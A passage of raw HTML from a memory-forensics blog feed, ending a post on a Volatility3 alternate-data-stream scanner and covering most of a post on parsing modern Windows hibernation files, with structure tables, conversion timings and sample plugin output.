<div class="language-zsh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-zsh codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª ./vol.py -r pretty  -f Triage-Memory.mem  windows.mftscan.ADS</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Formatting...0.00               PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.5.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |         Offset | Record Type | Record Number | MFT Type |                      Filename |    ADS Filename |                          Hexdump |                                          Disasm</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* | 0xf98001423650 |        FILE |         78477 |     DATA | putty-64bit-0.70-installer.msi | Zone.Identifier |                                  |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 | 5b 5a 6f 6e 65 54 72 61 [ZoneTra |                             0x0:    pop     rbx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 | 6e 73 66 65 72 5d 0d 0a nsfer].. |                             0x1:    pop     rdx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 | 5a 6f 6e 65 49 64 3d 33 ZoneId=3 |             0x2:    outsd   dx, dword ptr [rsi]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |              0x3:    outsb   dx, byte ptr [rsi]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                             0x4:    push    rsp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                            0x6:    jb      0x69</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |              0x8:    outsb   dx, byte ptr [rsi]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                            0x9:    jae     0x71</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                            0xb:    jb      0x6b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                 0xe:    or      eax, 0x6e6f5a0a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">* | 0xf98001432e40 |        FILE |         78539 |     DATA | PackageManagement_x64.msi     | Zone.Identifier |                                  |</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 | 5b 5a 6f 6e 65 54 72 61 [ZoneTra |                             0x0:    pop     rbx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 | 6e 73 66 65 72 5d 0d 0a nsfer].. |                             0x1:    pop     rdx</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 | 5a 6f 6e 65 49 64 3d 33 ZoneId=3 |             0x2:    outsd   dx, dword ptr [rsi]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |              0x3:    outsb   dx, byte ptr [rsi]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                             0x4:    push    rsp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                            0x6:    jb      0x69</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |              0x8:    outsb   dx, byte ptr [rsi]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                            0x9:    jae     0x71</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                            0xb:    jb      0x6b</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  |                |             |               |          |                               |                 |                                  |                 0xe:    or      eax, 0x6e6f5a0a</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/volads#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>The ability to scan for Alternate Data Stream is a good way to identify whether a file was downloaded from the internet or not. One can also identify malicious hidden data to help analysts upon an investigation to shed light onto the attack chain. The source code of this plugin can be found on Github: <a href="https://github.com/forensicxlab/volatility3/tree/feature/ADS" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3/tree/feature/ADS</a>, a pull request will be made to the volatility3 foundation for a potential integration to the framework.</p>
<blockquote>
<p>Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to enhance this article or to comment on the integration to the volatility framework.</p>
</blockquote>]]></content:encoded>
            <category>DFIR</category>
            <category>Volatility</category>
            <category>Memory Forensics</category>
        </item>
        <item>
            <title><![CDATA[üìò Volatility3: Modern Windows Hibernation file analysis]]></title>
            <link>https://forensicxlab.github.io/blog/hibernation</link>
            <guid>https://forensicxlab.github.io/blog/hibernation</guid>
            <pubDate>Fri, 27 Oct 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[In the Digital Forensics ecosystem, the field of memory forensics can help uncover artifacts that can‚Äôt be found anywhere else. That can include deleted files, network connections, running processes, rootkits, code injection, fileless malware and many more.]]></description>
            <content:encoded><![CDATA[<p>In the Digital Forensics ecosystem, the field of memory forensics can help uncover artifacts that can‚Äôt be found anywhere else. That can include deleted files, network connections, running processes, rootkits, code injection, fileless malware and many more.</p>
<p>Microsoft introduced the hibernation feature in Windows 2000, allowing systems to be powered down while preserving their volatile state. This is achieved by saving RAM contents and processor context to a file called hiberfil.sys before shutting down inside the root folder of the filesystem drive. When the computer is turned on again, the system restores the volatile state from the saved file. Hibernation files are valuable for digital forensic professionals as they store temporary data from RAM to non-volatile storage, eliminating the requirement for specialized tools on the target device.</p>
<p>The Hibernation file structure has evolved in time. In this blog post, we will dive into the structure of the modern Windows hibernation file and propose a new translation layer for the volatility3 framework to create a raw memory image from a hibernation file.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="the-structure-of-a-modern-hibernation-file">The structure of a modern hibernation file<a href="https://forensicxlab.github.io/blog/hibernation#the-structure-of-a-modern-hibernation-file" class="hash-link" aria-label="Direct link to The structure of a modern hibernation file" title="Direct link to The structure of a modern hibernation file">‚Äã</a></h2>
<p>The structure of the hibernation file can be divided into two variations:</p>
<ul>
<li>From Windows XP to Windows 7 (old)</li>
<li>From Windows 8 to Windows 11 (modern)</li>
</ul>
<p>The following image represent the modern structure.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/1-724f00b186f3fc6032dc7c20875e1f64.png" title="Structure" width="3585" height="5621" class="img_ev3q"></p>
<p>In this blog post we will focus on the modern hibernation structure<sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-1-602a43" id="user-content-fnref-1-602a43" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>, though you‚Äôll notice that the underlying principle remains the same which is to compress and store the physical memory pages of the hibernated system in specific data structures called ‚Äúrestoration sets‚Äù.
‚ÄÉ</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-file-header">The file header<a href="https://forensicxlab.github.io/blog/hibernation#the-file-header" class="hash-link" aria-label="Direct link to The file header" title="Direct link to The file header">‚Äã</a></h3>
<p>The hibernation files start with a header called PO_MEMORY_IMAGE. The structure of this header may differ slightly depending on the operating system version, but its definition is publicly available in the kernel's debugging symbols, which is very nice. The vergiliusproject<sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-2-602a43" id="user-content-fnref-2-602a43" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup> gives us a nice description of this structure for each Windows version. Below is an example of the structure of the header.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/2-5829bdfa225b7b984b67e4f53f213111.png" title="Header" width="1139" height="1059" class="img_ev3q"></p>
<p>The signature of the file for an exploitable hibernation file is ‚Äò<em>HIBR</em>‚Äô. The ‚Äò<em>RSTR</em>‚Äô signature indicates that the system is resuming from the file, making it apparently useless when this is the case. Valuable forensics artifacts are available like the system time when it was put into the hibernation state.</p>
<p>Notice the ‚Äú<strong>FirstBootRestorePage</strong>‚Äù and ‚Äú<strong>FirstKernelRestorePage</strong>‚Äù attributes. Those values are storing the page number of the first restoration sets. Mutiplying those values by the size of a Windows x64 page (4096) we get the offset of the sections.</p>
<p>Windows currently divide the storage of the memory pages in 2 locations :</p>
<ul>
<li>The boot section.</li>
<li>The kernel section.</li>
</ul>
<blockquote>
<p>You might notice the ‚ÄúSecureRestorePage‚Äù section, however this value seems to be always 0 and there is no publicly available explanation on what those pages are used for. It might be used in the future though to encrypt memory pages so only the host machine can decrypt them via its TPM?</p>
</blockquote>
<p>To know how many pages are stored for each sections the information can be retrieved from specific attributes:</p>
<ul>
<li>"<strong>NumPagesForLoader</strong>": The number of pages in the "Boot" section</li>
<li>"<strong>PerfInfo-&gt;KernelPagesProcessed</strong>": The number of pages in the "Kernel" section</li>
</ul>
<p>Unfortunately for us, the attribute storing the location and number of pages for the Kernel section did change with the Windows OS updates. Below is a table tracking those changes.</p>
<table><thead><tr><th>Windows Versions</th><th style="text-align:center">FirstKernelRestorePage  offset</th><th style="text-align:center">KernelPagesProcessed offset</th></tr></thead><tbody><tr><td>Windows 8/8.1</td><td style="text-align:center">0x68</td><td style="text-align:center">0x1C8</td></tr><tr><td>Windows 10 2016 1507-1511</td><td style="text-align:center">0x70</td><td style="text-align:center">0x218</td></tr><tr><td>Windows 10 2016 1607</td><td style="text-align:center">0x70</td><td style="text-align:center">0x220</td></tr><tr><td>Windows 10 2016 1703 - Windows 11 23H2</td><td style="text-align:center">0x70</td><td style="text-align:center">0x230</td></tr></tbody></table>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="the-compression-sets">The compression sets.<a href="https://forensicxlab.github.io/blog/hibernation#the-compression-sets" class="hash-link" aria-label="Direct link to The compression sets." title="Direct link to The compression sets.">‚Äã</a></h3>
<p>A restoration set contains multiple <strong>compression sets</strong>. Each compression set contains a header structure giving information about how many page descriptors it contains, the compression algorithm used and the size of the compressed concatenated pages of the set.</p>
<p>The compression algorithm used can be one the following:</p>
<ul>
<li>None: the pages are stored uncompressed</li>
<li>Xpress: The pages are stored using the Microsoft Xpress LZ77 Algorithm <sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-3-602a43" id="user-content-fnref-3-602a43" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup></li>
<li>HuffmanXpress: The pages are stored using the Microsoft Xpress LZ77+Huffman Algorithm <sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-3-602a43" id="user-content-fnref-3-602a43-2" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> <sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-4-602a43" id="user-content-fnref-4-602a43" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup></li>
</ul>
<p>All the page descriptors are located after the header and are describing where the pages reside in the decompressed data.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/3-29821d9c21906fce8efff01858ec9f6d.png" title="Structure" width="3111" height="2428" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="creating-a-volatility3-translation-layer">Creating a volatility3 translation layer<a href="https://forensicxlab.github.io/blog/hibernation#creating-a-volatility3-translation-layer" class="hash-link" aria-label="Direct link to Creating a volatility3 translation layer" title="Direct link to Creating a volatility3 translation layer">‚Äã</a></h2>
<p>To be able to read multiple memory image formats, the volatility3 framework is using what‚Äôs called ‚ÄúTranslation Layers‚Äù.  Each layer in volatility3 focuses on a particular aspect of memory forensics, such as parsing specific data structures, analyzing various kinds of artifacts, or understanding specific evidence formats. The layers can be seen as individual building blocks that can be stacked on top of each other in a specific order to build the right context before extracting data for analysis. As an example, a memory image with the "vmem" format will induce the stacking of the "VmwareLayer" to be able to read such file format and extract memory pages.</p>
<p>In our case, when the framework is requesting several bytes at a specific physical address, it needs to understand the structure of the hibernation file and how to extract the right pages. For this, we have to indicate to the framework for a given memory ‚Äúsegment‚Äù, the corresponding set of pages.</p>
<p>The Hibernation layer role is to provide the volatility framework with the following information :</p>
<ul>
<li>Check the file header to see if the layer needs to be stacked (check the signature to verify it is a hibernation file)</li>
<li>Build a list of segments: A segment is here to translates a given physical address to an offset inside of the uncompressed data of the relevant compression set.</li>
<li>Provide the decompression method for a given segment: Our layer needs to be able to decompress a given compression set and returns the number of bytes requested by the upper layer.</li>
</ul>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/4-e402600b47ddbcae56e7987da7377cab.png" title="Structure" width="2854" height="2402" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="implementation-of-the-different-compression-algorithms">Implementation of the different compression algorithms<a href="https://forensicxlab.github.io/blog/hibernation#implementation-of-the-different-compression-algorithms" class="hash-link" aria-label="Direct link to Implementation of the different compression algorithms" title="Direct link to Implementation of the different compression algorithms">‚Äã</a></h3>
<p>Windows is using two proprietary compression algorithms to compress the pages:</p>
<ul>
<li>Xpress: The Microsoft Xpress LZ77 Decompression Algorithm <sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-3-602a43" id="user-content-fnref-3-602a43-3" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup></li>
<li>HuffmanXpress: Microsoft Xpress LZ77+Huffman Decompression Algorithm <sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-3-602a43" id="user-content-fnref-3-602a43-4" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup> <sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-4-602a43" id="user-content-fnref-4-602a43-2" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup></li>
</ul>
<p>Those two algorithms were implemented and added to the volatility3 framework codecs without the needs of using the Windows API via cstruct (making this layer OS independant). Those algorithms are well documented but python3 is not really the best programming language to perform bitwise operations. Thus the developpement of those two algorithm took time to make sure that the decompressed page using our implementation is giving the same result as the native API <sup><a href="https://forensicxlab.github.io/blog/hibernation#user-content-fn-5-602a43" id="user-content-fnref-5-602a43" data-footnote-ref="true" aria-describedby="footnote-label">5</a></sup></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="proof-of-concept">Proof Of Concept<a href="https://forensicxlab.github.io/blog/hibernation#proof-of-concept" class="hash-link" aria-label="Direct link to Proof Of Concept" title="Direct link to Proof Of Concept">‚Äã</a></h3>
<p>After implementing this new translation layer, it was time to test it against multiple hibernation files. Knowing that we need to do a lot of decompressions operations, the hibernation layer is meant to be combine with the ‚Äúlayerwriter‚Äù plugin to create a raw memory image and then analyze it with the windows plugins. Indeed, the decompression of a set takes time and most of the plugin need to scan the entire memory dump pages making a lot of decompression operations thus slowing the framework. Creating a raw memory dump first is the best approach here for performances. To this end, 2 new plugins were added to the volatility3 framework:</p>
<ul>
<li><strong>windows.hibernation.Info</strong> : Display the basic information about the hibernation file and if it seems exploitable.</li>
<li><strong>windows.hibernation.Dump</strong> : Convert the hibernation file into a raw memory dump (based on the layerwriter plugin)</li>
</ul>
<p>The generation of the raw memory file was performed on 8 hibernations files from different versions of Windows:</p>
<table><thead><tr><th>Version / Target</th><th style="text-align:center">hiberfile size</th><th style="text-align:center">Conversion time</th></tr></thead><tbody><tr><td>Windows 8 x64 / Laptop</td><td style="text-align:center">8GB</td><td style="text-align:center">~30 minutes</td></tr><tr><td>Windows 10 1507 x64 / Laptop</td><td style="text-align:center">8GB</td><td style="text-align:center">~20 minutes</td></tr><tr><td>Windows 10 1607 x64 / Laptop</td><td style="text-align:center">8GB</td><td style="text-align:center">~20 minutes</td></tr><tr><td>Windows 10 1809 x64 / KVM</td><td style="text-align:center">8GB</td><td style="text-align:center">~10 minutes</td></tr><tr><td>Windows 10 1809 x64 / KVM</td><td style="text-align:center">4GB</td><td style="text-align:center">~5 minutes</td></tr><tr><td>Windows 10 22H02 x64 / Laptop</td><td style="text-align:center">8GB</td><td style="text-align:center">~60 minutes</td></tr><tr><td>Windows 10 22H02 x64 / Laptop</td><td style="text-align:center">16GB</td><td style="text-align:center">~100 minutes</td></tr><tr><td>Windows 11 23H02 x64 / Laptop</td><td style="text-align:center">8GB</td><td style="text-align:center">~100 minutes</td></tr></tbody></table>
<blockquote>
<p><strong>Note :</strong> On Windows 1809 hiberfile from a KVM, it was found that pages were located only in the boot section and none in the kernel section. The compressed data were either using the Xpress LZ77 compression or were not compressed but the Huffman variant was not identified. On Windows 22H2, most of the pages are located inside the kernel section using both plain LZ77 and LZ77+Huffman compression. It is not clear how Microsoft decides which compression algorithm is used and if both sections are used to store the pages.</p>
</blockquote>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="usage--conversion">Usage : Conversion<a href="https://forensicxlab.github.io/blog/hibernation#usage--conversion" class="hash-link" aria-label="Direct link to Usage : Conversion" title="Direct link to Usage : Conversion">‚Äã</a></h4>
<p>Firstly, we check if the hibernation file seems exploitable :</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/volatility3¬ª ./vol.py -f hiberfil_Win10_1507.sys windows.hibernation.Info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.5.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  100.00               PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Variable        Value</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Signature       b'HIBR'</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PageSize        4096</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Comment The hibernation file header signature is correct.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">System Time     2023-11-03 20:32:25</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">FirstBootRestorePage    0x23</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">NumPagesForLoader       32199</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Next, we can try to convert the hibernation file to a raw file:</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/volatility3¬ª ./vol.py -f hiberfil_Win10_1507.sys windows.hibernation.Dump -h</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">usage: volatility windows.hibernation.Dump [-h] --version VERSION</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">optional arguments:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  -h, --help         show this help message and exit</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  --version VERSION  The Windows version of the hibernation file :</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        0=&gt;[Windows 10 1703 to Windows 11 23H2]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        1=&gt;[Windows 8/8.1]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        2=&gt;[Windows 10 1507 to 1511]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        3=&gt;[Windows 10 1607]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/volatility3¬ª ./vol.py -f hiberfil_Win10_1507.sys windows.hibernation.Dump --version 2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:   99.99               Writing layer memory_layer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">The hibernation file was converted to memory_layer.raw</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="example-pslist">Example: pslist<a href="https://forensicxlab.github.io/blog/hibernation#example-pslist" class="hash-link" aria-label="Direct link to Example: pslist" title="Direct link to Example: pslist">‚Äã</a></h4>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/volatility3¬ª ./vol.py -f memory_layer.raw windows.pslist</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.5.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  100.00		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4	0	System	0xe5072e280300	182	-	N/A	False	2023-09-30 14:52:10.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">136	4	Registry	0xe5072e2ee040	4	-	N/A	False	2023-09-30 14:52:09.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">400	4	smss.exe	0xe507322aa0c0	3	-	N/A	False	2023-09-30 14:52:10.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">532	484	csrss.exe	0xe50732242140	13	-	0	False	2023-09-30 14:52:11.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">628	484	wininit.exe	0xe50734c6a080	5	-	0	False	2023-09-30 14:52:12.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">636	620	csrss.exe	0xe50734c6f140	13	-	1	False	2023-09-30 14:52:12.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">700	628	services.exe	0xe50734cf0100	17	-	0	False	2023-09-30 14:52:12.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">708	628	lsass.exe	0xe50734d25080	9	-	0	False	2023-09-30 14:52:12.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">840	700	svchost.exe	0xe50734d8e280	29	-	0	False	2023-09-30 14:52:12.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">868	628	fontdrvhost.ex	0xe50734db9180	5	-	0	False	2023-09-30 14:52:12.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">932	700	svchost.exe	0xe50734b25540	13	-	0	False	2023-09-30 14:52:12.000000 	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">[TRUNCATED]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="example--netscan">Example : netscan<a href="https://forensicxlab.github.io/blog/hibernation#example--netscan" class="hash-link" aria-label="Direct link to Example : netscan" title="Direct link to Example : netscan">‚Äã</a></h4>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~/work/DFIR/volatility3¬ª ./vol.py -f memory_layer.raw windows.netscan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility 3 Framework 2.5.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  100.00		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Offset	Proto	LocalAddr	LocalPort	ForeignAddr	ForeignPort	State	PID	Owner	Created</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe507320e1b00	TCPv4	127.0.0.1	49743	127.0.0.1	49742	ESTABLISHED	6660	RiotClientServ	2023-09-30 14:52:33.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50733c5ba60	TCPv4	192.168.122.74	49883	8.247.201.124	443	ESTABLISHED	6660	RiotClientServ	2023-09-30 14:52:38.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50734ab2d00	TCPv4	0.0.0.0	135	0.0.0.0	0	LISTENING	932	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50734ab2d00	TCPv6	::	135	::	0	LISTENING	932	svchost.exe	2023-09-30 14:52:12.000000</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0xe50734ab2e50	TCPv4	0.0.0.0	49664	0.0.0.0	0	LISTENING	628	wininit.exe	